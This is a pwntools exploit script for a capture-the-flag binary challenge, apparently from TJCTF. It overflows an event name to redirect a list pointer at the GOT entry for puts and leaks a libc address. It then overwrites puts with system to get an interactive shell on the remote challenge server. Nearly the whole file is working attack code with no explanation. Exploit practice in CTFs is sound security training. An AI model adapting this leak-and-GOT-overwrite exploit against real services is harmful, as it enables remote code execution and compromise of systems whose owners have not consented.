#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'tjc.tf', 31509

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set resolve-heap-via-heuristic force
    # set sysroot /proc/{pid}/root
    b *displayEvents+93
    # b *main+768
    b *__stack_chk_fail
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='chall')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    with log.progress("Overwrite cur->next = puts + 1"), context.silent:
        io.sendlineafter(b'Event time? (1-24) ', b"1")
        io.sendlineafter(b'Event name? ', cyclic(128 + 4) + p64(elf.got["puts"] - 3))
        io.recvuntil(b' - ')
        io.recvuntil(b' - ')
        libc_leak = (u64(io.recvline().strip().ljust(8, b'\x00')) << 8) + 0xe0
        libc.address = libc_leak - libc.sym['puts']
    log.info(f'Libc base: %#x', libc_leak)
    log.info(f'Libc base: %#x', libc.address)
    log.info(f'Libc system: %#x', libc.sym['system'])
    with log.progress("Overwrite got puts = system"), context.silent:
        io.sendlineafter(b'Event time? (1-24) ', str(0x50505050).encode()) # First byte of system
        io.sendlineafter(b'Event name? ', p64(libc.sym['system'])[1:]) 
    io.interactive()

if __name__ == '__main__':
    exploit()
